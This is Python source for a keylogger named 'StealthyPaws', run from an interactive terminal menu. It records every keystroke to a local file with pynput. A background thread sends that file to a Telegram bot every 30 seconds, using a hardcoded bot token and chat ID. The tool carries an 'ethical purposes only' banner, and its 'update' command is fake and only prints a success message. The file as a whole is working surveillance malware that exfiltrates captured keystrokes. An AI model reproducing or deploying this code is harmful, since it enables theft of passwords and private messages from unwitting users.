import time
import os
import platform
import sys
import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime
import asyncio
from telegram import Bot
from threading import Thread

# File to store the logs
LOG_FILE = "keylog.txt"

# Ensure the log file exists
if not os.path.exists(LOG_FILE):
    open(LOG_FILE, 'w').close()

# Global variables
current_word = ""
options_shown = False  # To track if options have been shown for the first time
keylogger_running = False  # Flag to check if the keylogger is running

# Telegram bot credentials
BOT_TOKEN = "8142283838:AAGDr5f9vwL6rIAZ9rIKeqaI4BFn1j2GZmA"  # Replace with your bot token
CHAT_ID = "1182132105"  # Replace with your chat ID
LOG_FILE = "keylog.txt"   # Path to the log file

# Function to check platform and clear screen 
def Check_Platform():
    if platform.system() == 'Windows':
        os.system('cls')
    elif platform.system() in ['Linux', 'Darwin']:
        os.system('clear')
    else:
        print('Command Not Found')
        exit()

Check_Platform()

banner = '''\033[1;32m  
█▀ ▀█▀ █▀▀ ▄▀█ █░░ ▀█▀ █░█ █▄█  █▀█ ▄▀█ █░█░█ █▀   \033[1;33mGithub: \033[0mameeshaheshan
▄█ ░█░ ██▄ █▀█ █▄▄ ░█░ █▀█ ░█░  █▀▀ █▀█ ▀▄▀▄▀ ▄█   \033[1;33mVersion: \033[0m1.0
\033[1;34m=================================================\033[0m
\033[1;32m     WELCOME TO StealthyPaws 🐾 - KEYLOGGER      \033[0m
\033[0m   A lightweight and efficient keylogger tool
\033[1;34m=================================================\033[0m
\033[1;31m ⚡ Use Responsibly - For Ethical Purposes Only ⚡\033[0m

'''

def animated_banner(text, delay=0.008):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

animated_banner(banner)

print('\033[1;31m ⚡ Type "\033[1;37mshow option\033[1;31m" to see available commands.\n')

# Function to display available commands
def show_options():
    options_text = '''
\033[1;36mAvailable Commands:\033[0m
  4. \033[1;33mrun \033[1;37m: Start the keylogger
  3. \033[1;33mclear \033[1;37m: Clear the console (except banner)
  1. \033[1;33mupdate \033[1;37m: Update the tool to the latest version
  2. \033[1;33mexit \033[1;37m: Exit the tool

'''
    print(options_text)

# Function to write logs to the file
def write_log(word):
    if word:  # Log only if there's a word
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {word}\n"
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

# Function to handle key logging
def log_key(key):
    global current_word

    try:
        # Convert key to string
        if hasattr(key, 'char') and key.char is not None:
            current_word += key.char  # Add character to the current word
        elif key == Key.space:  # Word separator
            write_log(current_word)
            current_word = ""  # Reset for the next word
        elif key in [Key.enter, Key.tab]:  # Newline or tab, treat as word end
            write_log(current_word)
            current_word = ""
        elif key == Key.backspace:  # Handle backspace
            current_word = current_word[:-1]
    except Exception as e:
        write_log(f"[Error processing key: {e}]")

# Function to start the keylogger
def start_keylogger():
    global keylogger_running
    keylogger_running = True
    print("\033[1;32m[+] Keylogger started. Capturing keys... Press Ctrl+C to stop.\033[0m")
    try:
        with Listener(on_press=log_key) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Keylogger stopped by user.\033[0m")
        keylogger_running = False

# Function to send the log file to Telegram (asynchronous)
async def send_log_via_telegram():
    bot = Bot(token=BOT_TOKEN)
    while True:
        try:
            if keylogger_running:
                if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                    with open(LOG_FILE, "rb") as log_file:
                        await bot.send_document(chat_id=CHAT_ID, document=log_file)
                    print("\033[1;32m[+] Log file sent to Telegram.\033[0m\n")
                else:
                    with open(LOG_FILE, "a") as log_file:
                        log_file.write("Log file is empty.\n")
                    with open(LOG_FILE, "rb") as log_file:
                        await bot.send_document(chat_id=CHAT_ID, document=log_file)
                    print("\033[1;32m[+] Log file is empty. Sent an empty log.\033[0m")
        except Exception as e:
            print(f"\033[1;31m[!] Error sending log file: {e}\033[0m")
        await asyncio.sleep(30)  # Wait for 30 seconds before sending again

# Function to start the Telegram log sender in a separate thread
def start_log_sender():
    asyncio.run(send_log_via_telegram())

# Interactive command prompt
def interactive_prompt():
    global keylogger_running
    while True:
        user_input = input("\033[1;32mStealthyPaws > \033[0m").strip().lower()

        if user_input == "show option":
            show_options()
        elif user_input == "update":
            print("\033[1;32m[+] Checking for updates...\033[0m")
            time.sleep(2)  # Simulating the update process
            print("\033[1;32m[+] Tool updated to the latest version successfully!\033[0m")
        elif user_input == "exit":
            print("\033[1;31m[+] Exiting StealthyPaws. Goodbye!\033[0m")
            break
        elif user_input == "clear":
            Check_Platform()
            print(banner)
        elif user_input == "run" and not keylogger_running:
            print("\033[1;32m[+] Starting the keylogger...\033[0m")
            # Start the keylogger and log sender
            log_sender_thread = Thread(target=start_log_sender, daemon=True)
            log_sender_thread.start()
            start_keylogger()  # Start the keylogger
        elif user_input == "run" and keylogger_running:
            print("\033[1;31m[!] Keylogger is already running.\033[0m")
        else:
            print("\033[1;31m[!] Invalid command. Type 'show option' to see available commands.\033[0m")

# Run the prompt
interactive_prompt()